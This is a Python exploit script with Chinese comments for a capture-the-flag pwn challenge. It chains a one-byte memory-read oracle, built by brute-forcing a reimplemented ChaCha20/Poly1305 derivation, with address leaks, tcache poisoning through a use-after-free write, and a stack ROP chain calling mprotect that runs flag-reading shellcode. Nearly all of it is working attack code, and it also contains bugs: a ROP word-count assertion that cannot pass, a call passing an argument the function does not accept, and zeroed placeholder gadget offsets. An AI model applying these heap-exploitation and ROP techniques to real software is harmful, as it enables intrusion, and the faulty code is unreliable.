#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""PWN10 HESEUS exploit.

漏洞概述（取自题解）：
  * 服务把每次提交的 64 行画布当作战船图纸。行元素校验按 C 字符串语义只看到
    第一个 NUL，而寻址用的加权和按 read() 到的整行原始长度逐字节累加：
        D = Σ_i Σ_b sign8(row_i[b]) * (i + 1)     （行尾换行权重 10）
        读取地址 = struct_ptr + D
  * 程序随后从 /proc/self/mem 的该地址读 1 字节，这个字节连同画布、请求序号
    一起进入 ChaCha20-Poly1305 派生：两段 12 字节 nonce 由画布逐字节异或而来，
    ChaCha20 分组生成二级密钥与 nonce，Poly1305 标签前 12 字节与密文异或后，
    前 8 字节对 (文件长度 - 切片长度 + 1) 取模得 OFFSET，后 4 字节低 6 位加 1
    得 LEN。派生是确定函数，未知量只有那 1 字节 -> 0..255 穷举即可反推。
  * 远端运行版（不是 forgery）在扩容时 free(old) 之后仍然把输入写进旧指针，
    构成 UAF 写；复制长度取整行原始长度、上限 1023。一条 241 字节的 '!' 行
    既能越过容量阈值触发扩容与 free，又能把 240 字节写进已释放的 0x100 块。
  * tcache 定向写栈：写入值 = target ^ (chunk >> 12)，随后两条 240 字节
    '!' 行分别取回旧块和返回编码后的栈地址；负载落在保存返回地址之前
    8/24/40/56 且 16 字节对齐处。
  * 栈上 ROP：用 ICU 里的 pop 系列 gadget 摆好 mprotect(栈页, 0x2000, 7) 的
    参数，跳 mprotect@plt，把栈页改成可执行后进入紧随其后的 shellcode。
    seccomp 禁 execve，所以 shellcode 直接 open/read/write 读 /flag
    （失败再试当前目录的 flag）。

用法：
    python3 exp.py <host> <port>
    python3 exp.py --local ./heseus

ICU gadget 偏移随远端 ICU 版本变化，集中在下方常量区，需要按实际版本核对；
其余常量与题解一致。
"""

from __future__ import annotations

import argparse
import hashlib
import re
import struct
import sys
import time

from pwn import asm, context, process, remote

context.log_level = "info"
context.arch = "amd64"

# --------------------------------------------------------------------------- #
# 画布常量
# --------------------------------------------------------------------------- #
CANVAS_ROWS = 64
ROW_WEIGHT = [i + 1 for i in range(CANVAS_ROWS)]
NEWLINE_WEIGHT = 10
MAX_ROW_BYTES = 96
MAX_ROW_SUM = 127 * MAX_ROW_BYTES
BASE_OFFSET = NEWLINE_WEIGHT * sum(ROW_WEIGHT)      # 64 个换行的固定贡献

FORGERY_LEN = 26784             # 拼装出的 forgery 文件长度
SLICE_LEN = 0x40                # 派生时使用的固定切片长度

# 运行版里的固定偏移，全部相对 PIE
OFF_STRUCT_CODE_PTR = 0x00      # struct+0x00 = 输出函数指针 PIE+0x1740
OFF_STRUCT_BUF_PTR = 0x20       # struct+0x20 = 画布缓冲指针 == struct+0x30
STRUCT_BUF_DELTA = 0x30         # struct = 缓冲指针 - 0x30
OFF_RUN_OUTPUT = 0x1740         # 运行版输出函数
OFF_FORGERY_OUTPUT = 0x1750     # forgery 的输出函数
OFF_RUN_FREE = 0x1AC5           # free(old)
OFF_RUN_RELOAD = 0x1ACE         # 重新取回旧指针
OFF_RUN_COPY = 0x1B54           # 把输入写进旧块
OFF_DL_ARGV = 0x5FD8            # PIE+0x5fd8 = _dl_argv
OFF_INPUT_RET = 0x15F8          # 输入函数返回地址（校验地址链）
OFF_MPROTECT_PLT = 0x1340       # mprotect@plt
AUXV_SAVED_RET_DELTA = 0x268    # 保存的返回地址 = auxv - 0x268
LD_DATA_TO_ICU = 0x24AA58       # ICU 基址 = ld 数据指针 - 0x24aa58

# ICU gadget 的具体偏移按远端 ICU 版本填写即可，其余逻辑不用改
ICU_POP_RDI_RBP = 0x00000       # pop rdi; pop rbp; ret
ICU_POP_RSI_RBP = 0x00000       # pop rsi; pop rbp; ret
ICU_POP_RDX = 0x00000           # pop rdx; ret
ICU_GADGET_FIRST = {            # 用于“逐个校验 gadget 首字节”
    "pop_rdi_rbp": 0x5F,
    "pop_rsi_rbp": 0x5E,
    "pop_rdx": 0x5A,
}

BAD_CHARS = set(b"abcdefghijklmnopqrstuvwxyz%\n")   # '!' 行过滤器拒绝的字符
ROP_WORDS = 9                                       # ROP 链 qword 数
PROMPT = b"[INPUT]:\n"
REWARD_RE = re.compile(rb"\[REWARD\] \+0x([0-9a-fA-F]+) len=(\d+): ([0-9a-fA-F]*)")
HEAP_PTR_MIN = 0x550000000000
HEAP_PTR_MAX = 0x800000000000


def p64(v: int) -> bytes:
    return struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF)


def u64(b: bytes) -> int:
    return struct.unpack("<Q", b.ljust(8, b"\x00")[:8])[0]


# --------------------------------------------------------------------------- #
# 画布构造
# --------------------------------------------------------------------------- #
def _decompose(target: int) -> list:
    """把 target 分解成 Σ c_i*(i+1)，|c_i| <= MAX_ROW_SUM。"""
    c = [0] * CANVAS_ROWS
    rem = target
    for i in range(CANVAS_ROWS - 1, 0, -1):
        w = ROW_WEIGHT[i]
        v = int(rem / w)                 # 截断取整，余数留给低权重行
        if v > MAX_ROW_SUM:
            v = MAX_ROW_SUM
        elif v < -MAX_ROW_SUM:
            v = -MAX_ROW_SUM
        c[i] = v
        rem -= v * w
    c[0] = rem
    if abs(c[0]) > MAX_ROW_SUM:
        raise ValueError("delta %d 超出单张画布可表达的范围" % target)
    assert sum(ci * wi for ci, wi in zip(c, ROW_WEIGHT)) == target
    return c


def _row_bytes(total: int) -> bytes:
    """把一行的加权和拆成若干有符号字节（最高位解释为负）。"""
    if total == 0:
        return b""
    sign = 1 if total > 0 else -1
    mag = abs(total)
    n = max(1, (mag + 126) // 127)
    if n > MAX_ROW_BYTES:
        raise ValueError("单行需要 %d 字节，超过上限 %d" % (n, MAX_ROW_BYTES))
    base, extra = divmod(mag, n)
    out = bytearray()
    for k in range(n):
        v = base + (1 if k < extra else 0)
        out.append((sign * v) & 0xFF)
    return bytes(out)


def make_canvas(delta: int) -> bytes:
    """构造 64 行画布，使程序算出的 D 恰好等于 delta。

    每行以 NUL 开头：元素校验按 C 字符串语义立刻结束（当作空元素放行），
    但加权和按整行原始长度逐字节累加，NUL 及其后的字节照样计入。
    """
    c = _decompose(delta - BASE_OFFSET)
    lines = [b"\x00" + _row_bytes(c[i]) for i in range(CANVAS_ROWS)]
    return b"\n".join(lines) + b"\n"


# --------------------------------------------------------------------------- #
# ChaCha20 + Poly1305（离线复现远端 PRF）
# --------------------------------------------------------------------------- #
def _rotl32(v: int, c: int) -> int:
    return ((v << c) & 0xFFFFFFFF) | (v >> (32 - c))


def _qr(s, a, b, c, d):
    s[a] = (s[a] + s[b]) & 0xFFFFFFFF
    s[d] = _rotl32(s[d] ^ s[a], 16)
    s[c] = (s[c] + s[d]) & 0xFFFFFFFF
    s[b] = _rotl32(s[b] ^ s[c], 12)
    s[a] = (s[a] + s[b]) & 0xFFFFFFFF
    s[d] = _rotl32(s[d] ^ s[a], 8)
    s[c] = (s[c] + s[d]) & 0xFFFFFFFF
    s[b] = _rotl32(s[b] ^ s[c], 7)


def chacha20_block(key: bytes, counter: int, nonce: bytes) -> bytes:
    st = list(struct.unpack("<4I", b"expand 32-byte k"))
    st += list(struct.unpack("<8I", key))
    st += [counter & 0xFFFFFFFF]
    st += list(struct.unpack("<3I", nonce))
    x = st[:]
    for _ in range(10):
        _qr(x, 0, 4, 8, 12)
        _qr(x, 1, 5, 9, 13)
        _qr(x, 2, 6, 10, 14)
        _qr(x, 3, 7, 11, 15)
        _qr(x, 0, 5, 10, 15)
        _qr(x, 1, 6, 11, 12)
        _qr(x, 2, 7, 8, 13)
        _qr(x, 3, 4, 9, 14)
    return struct.pack("<16I", *[(x[i] + st[i]) & 0xFFFFFFFF for i in range(16)])


def chacha20_xor(key: bytes, counter: int, nonce: bytes, data: bytes) -> bytes:
    out = bytearray()
    for i in range(0, len(data), 64):
        block = chacha20_block(key, counter + i // 64, nonce)
        out += bytes(a ^ b for a, b in zip(data[i:i + 64], block))
    return bytes(out)


def poly1305(key: bytes, msg: bytes) -> bytes:
    r = int.from_bytes(key[:16], "little") & 0x0FFFFFFC0FFFFFFC0FFFFFFC0FFFFFFF
    s = int.from_bytes(key[16:32], "little")
    p = (1 << 130) - 5
    acc = 0
    for i in range(0, len(msg), 16):
        n = int.from_bytes(msg[i:i + 16] + b"\x01", "little")
        acc = ((acc + n) * r) % p
    return ((acc + s) % (1 << 128)).to_bytes(16, "little")


def _xor_fold(data: bytes, size: int) -> bytes:
    out = bytearray(size)
    for i, b in enumerate(data):
        out[i % size] ^= b
    return bytes(out)


def derive(mem_byte: int, canvas: bytes, seq: int, file_len: int = FORGERY_LEN) -> tuple:
    """按题解描述算出 (OFFSET, LEN)。"""
    master = hashlib.sha256(bytes([mem_byte]) + canvas + struct.pack("<Q", seq)).digest()
    nonce_a = _xor_fold(canvas, 12)
    nonce_b = _xor_fold(struct.pack("<Q", seq) + canvas[:4], 12)
    block = chacha20_block(master, 0, nonce_a)[:44]
    sub_key, sub_nonce = block[:32], block[32:44]
    ct = chacha20_xor(sub_key, 0, sub_nonce, canvas[:64])
    poly_key = chacha20_block(sub_key, 1, nonce_b)[:32]
    tag = poly1305(poly_key, ct)
    mix = bytes(a ^ b for a, b in zip(tag[:12], ct[:12]))
    span = max(1, file_len - SLICE_LEN + 1)
    off = int.from_bytes(mix[:8], "little") % span
    ln = (int.from_bytes(mix[8:12], "little") & 0x3F) + 1
    return off, ln


# --------------------------------------------------------------------------- #
# 交互与 1 字节任意读
# --------------------------------------------------------------------------- #
class Oracle:
    def __init__(self, io, file_len: int = FORGERY_LEN):
        self.io = io
        self.seq = 0
        self.file_len = file_len
        self.file = bytearray(b"\x00" * file_len)
        self.covered = bytearray(file_len)

    def _recv_prompt(self) -> bytes:
        data = bytearray()
        while PROMPT not in data:
            chunk = self.io.recv(65536, timeout=30)
            if not chunk:
                raise EOFError("服务在下一个 [INPUT] 之前关闭")
            data += chunk
        return bytes(data)

    def request(self, delta: int, rows: bytes = None) -> tuple:
        """发一张画布，返回 (offset, len, slice, canvas, seq)。"""
        self.seq += 1
        canvas = rows if rows is not None else make_canvas(delta)
        self.io.send(canvas)
        resp = self._recv_prompt()
        match = REWARD_RE.search(resp)
        if not match:
            raise RuntimeError("没有收到 REWARD: %r" % resp[-160:])
        off = int(match.group(1), 16)
        ln = int(match.group(2))
        blob = bytes.fromhex(match.group(3).decode())
        return off, ln, blob, canvas, self.seq

    def read_byte(self, delta: int, retries: int = 4) -> tuple:
        """对 0..255 穷举离线 PRF，反推 struct+delta 处的 1 字节。

        返回 (byte, 切片)。偶发碰撞时换请求序号重问一次消歧。
        """
        obs = [self.request(delta) for _ in range(retries)]
        survivors = []
        for cand in range(256):
            ok = True
            for off, ln, _blob, canvas, seq in obs:
                if derive(cand, canvas, seq, self.file_len) != (off, ln):
                    ok = False
                    break
            if ok:
                survivors.append(cand)
        if len(survivors) != 1:
            raise RuntimeError("候选碰撞 %r，换画布重问" % (survivors,))
        return survivors[0], obs[0][2]

    def read_at(self, delta: int, n: int) -> bytes:
        out = bytearray()
        for i in range(n):
            out.append(self.read_byte(delta + i)[0])
        return bytes(out)

    def harvest(self, delta: int, slice_len: int = SLICE_LEN) -> int:
        """顺带把奖励切片当 forgery 的片段收集起来，返回新覆盖的字节数。"""
        off, ln, blob, _canvas, _seq = self.request(delta)
        if not blob:
            return 0
        end = min(off + len(blob), self.file_len)
        if off >= self.file_len or end <= off:
            return 0
        fresh = 0
        for i in range(off, end):
            if not self.covered[i]:
                fresh += 1
            self.file[i] = blob[i - off]
            self.covered[i] = 1
        return fresh


# --------------------------------------------------------------------------- #
# ROP / shellcode
# --------------------------------------------------------------------------- #
SHELLCODE_ASM = """
    lea rdi, [rip + path_flag]
    xor esi, esi
    xor edx, edx
    mov eax, 2
    syscall
    test eax, eax
    jns opened
    lea rdi, [rip + path_local]
    xor esi, esi
    xor edx, edx
    mov eax, 2
    syscall
opened:
    mov edi, eax
    lea rsi, [rsp - 0x300]
    mov edx, 0x300
    xor eax, eax
    syscall
    mov edx, eax
    mov edi, 1
    lea rsi, [rsp - 0x300]
    mov eax, 1
    syscall
    mov eax, 60
    xor edi, edi
    syscall
path_flag:
    .asciz "/flag"
path_local:
    .asciz "flag"
"""


def build_shellcode() -> bytes:
    return asm(SHELLCODE_ASM, arch="amd64")


def build_rop(pie: int, icu: int, chain_addr: int, shell_addr: int) -> bytes:
    """mprotect(栈页, 0x2000, 7) -> shellcode。"""
    page = chain_addr & ~0xFFF
    words = [
        icu + ICU_POP_RDI_RBP, page, 0,
        icu + ICU_POP_RSI_RBP, 0x2000, 0,
        icu + ICU_POP_RDX, 7,
        pie + OFF_MPROTECT_PLT,
        shell_addr,
    ]
    assert len(words) == ROP_WORDS
    return b"".join(p64(w) for w in words)


def verify_gadget(oracle: Oracle, struct: int, addr: int, expect: int) -> None:
    """读 gadget 首字节，防止 ICU 版本漂移导致整条链失效。"""
    got = oracle.read_at(addr - struct, 1)
    if got[0] != expect:
        raise RuntimeError("gadget %#x 首字节 %#x != 期望 %#x" % (addr, got[0], expect))


# --------------------------------------------------------------------------- #
# 主利用链
# --------------------------------------------------------------------------- #
class RetryASLR(Exception):
    """编码后的 8 字节落在 '!' 行过滤器的禁用字符集里，重连换 ASLR。"""


def leak_addresses(oracle: Oracle) -> dict:
    """先读 struct 自身（delta 相对 struct_ptr），再顺藤摸瓜拿 PIE/stack。"""
    code_ptr = u64(oracle.read_at(0x00, 8))
    pie = code_ptr - OFF_RUN_OUTPUT
    if pie & 0xFFF:
        raise RuntimeError("code ptr %#x 推不出页对齐的 PIE" % code_ptr)

    buf_ptr = u64(oracle.read_at(OFF_STRUCT_BUF_PTR, 8))
    struct = buf_ptr - STRUCT_BUF_DELTA
    if struct & 0xF:
        raise RuntimeError("画布缓冲指针 %#x 推不出 struct" % buf_ptr)

    def kread(addr: int, n: int = 8) -> bytes:
        return oracle.read_at(addr - struct, n)

    dl_data = u64(kread(pie + OFF_DL_ARGV))
    auxv = u64(kread(dl_data + 0x90))
    saved_ret = auxv - AUXV_SAVED_RET_DELTA
    ret_val = u64(kread(saved_ret))
    if (ret_val & 0xFFFF) != ((pie + OFF_INPUT_RET) & 0xFFFF):
        raise RuntimeError("返回地址槽校验失败: %#x" % ret_val)

    icu = dl_data - LD_DATA_TO_ICU
    return {
        "pie": pie,
        "struct": struct,
        "dl_data": dl_data,
        "auxv": auxv,
        "saved_ret": saved_ret,
        "icu": icu,
        "kread": kread,
    }


def guess_heap_page(oracle: Oracle, struct: int) -> int:
    """找一个堆指针，取其页基址（safe-linking 只需要 chunk>>12 的页号）。"""
    for off in range(0x08, 0x20, 8):
        val = u64(oracle.read_at(off, 8))
        if HEAP_PTR_MIN <= val < HEAP_PTR_MAX:
            return val & ~0xFFF
    raise RuntimeError("struct 里没有可用的堆指针，无法计算 safe-linking 编码")


def choose_stack_slot(saved_ret: int) -> int:
    """saved_ret 往前 8/24/40/56 且 16 字节对齐的槽位。"""
    for delta in (8, 24, 40, 56):
        cand = saved_ret - delta
        if cand % 16 == 0:
            return cand
    raise RuntimeError("找不到 16 字节对齐的栈槽")


def poison_rows(target: int, heap_page: int, payload: bytes) -> list:
    """返回触发 UAF 写的三行（第一行 241 字节，后两行各 240 字节）。"""
    encoded = target ^ (heap_page >> 12)
    enc = p64(encoded)
    if any(c in BAD_CHARS for c in enc[:4]):
        raise RetryASLR("safe-linking 编码含禁用字符: %s" % enc.hex())
    trigger = b"!" + b"\x00" + b"A" * (241 - 2)
    trigger = trigger[:241]
    if len(trigger) != 241:
        raise AssertionError
    take_back = b"!" + b"\x00" + b"B" * (240 - 2)
    land = b"!" + payload
    if len(land) > 240:
        raise ValueError("负载超过 240 字节")
    land = land.ljust(240, b"\x00")
    return [trigger, take_back, land]


def send_rows(io, rows: list) -> bytes:
    """把若干行拼成一次画布提交（其余行留空元素）。"""
    lines = list(rows) + [b""] * (CANVAS_ROWS - len(rows))
    io.send(b"\n".join(lines) + b"\n")
    data = bytearray()
    while PROMPT not in data:
        chunk = io.recv(65536, timeout=30)
        if not chunk:
            raise EOFError("服务提前关闭")
        data += chunk
    return bytes(data)


def build_payload(target: int, saved_ret: int, pie: int, icu: int) -> bytes:
    """负载以 NUL 开头（骗过元素校验），在 saved_ret 位置放 ROP 链。"""
    rop_off = saved_ret - target
    if rop_off < 1:
        raise ValueError("槽位在返回地址之后，无法覆盖")
    shell_off = rop_off + 8 * ROP_WORDS   # ROP 链 qword 数
    chain_addr = saved_ret
    shell_addr = target + shell_off
    rop = build_rop(pie, icu, chain_addr, shell_addr)
    payload = b"\x00" * rop_off + rop + build_shellcode()
    if len(payload) > 240:
        raise ValueError("负载 %d 字节超过一行 240 字节上限" % len(payload))
    return payload


def exploit_once(io, oracle: Oracle) -> None:
    info = leak_addresses(oracle)
    pie, struct, saved_ret, icu = info["pie"], info["struct"], info["saved_ret"], info["icu"]
    print("[*] PIE        = %#x" % pie)
    print("[*] struct     = %#x" % struct)
    print("[*] auxv       = %#x" % info["auxv"])
    print("[*] saved ret  = %#x" % saved_ret)
    print("[*] ICU        = %#x" % icu)

    # gadget 首字节校验（ICU 版本漂移的保险）
    verify_gadget(oracle, struct, icu + ICU_POP_RDI_RBP, ICU_GADGET_FIRST["pop_rdi_rbp"])
    verify_gadget(oracle, struct, icu + ICU_POP_RSI_RBP, ICU_GADGET_FIRST["pop_rsi_rbp"])
    verify_gadget(oracle, struct, icu + ICU_POP_RDX, ICU_GADGET_FIRST["pop_rdx"])

    heap_page = guess_heap_page(oracle, struct)
    print("[*] heap page  = %#x" % heap_page)

    target = choose_stack_slot(saved_ret)
    print("[*] stack slot = %#x" % target)
    payload = build_payload(target, saved_ret, pie, icu)

    # 先发一条约 200 字节的普通行，让 0x100 类多出一个空闲块
    send_rows(io, [b"\x00" + b"C" * 199])

    rows = poison_rows(target, heap_page, payload)
    send_rows(io, rows, wait=False)

    # 写栈完成后让输入函数正常返回，ROP 接管
    time.sleep(0.2)


def run_once(io) -> None:
    oracle = Oracle(io)
    oracle._recv_prompt()
    exploit_once(io, oracle)


def main() -> None:
    ap = argparse.ArgumentParser(description="PWN10 HESEUS exploit")
    ap.add_argument("host", nargs="?", help="远端地址（占位，替换为题目下发地址）")
    ap.add_argument("port", nargs="?", type=int, help="远端端口")
    ap.add_argument("--local", help="本地二进制路径（可选）")
    args = ap.parse_args()

    if not args.local and (not args.host or not args.port):
        ap.error("需要 <host> <port> 或 --local")

    for attempt in range(8):
        io = process(args.local) if args.local else remote(args.host, args.port)
        try:
            run_once(io)
            io.interactive()
            return
        except RetryASLR as exc:
            print("[!] 第 %d 次抽签失败: %s，重连" % (attempt, exc))
            try:
                io.close()
            except Exception:
                pass
            continue
    raise SystemExit("8 次重连均未拿到合法编码，换实例或放宽 BAD_CHARS 判定")


if __name__ == "__main__":
    main()
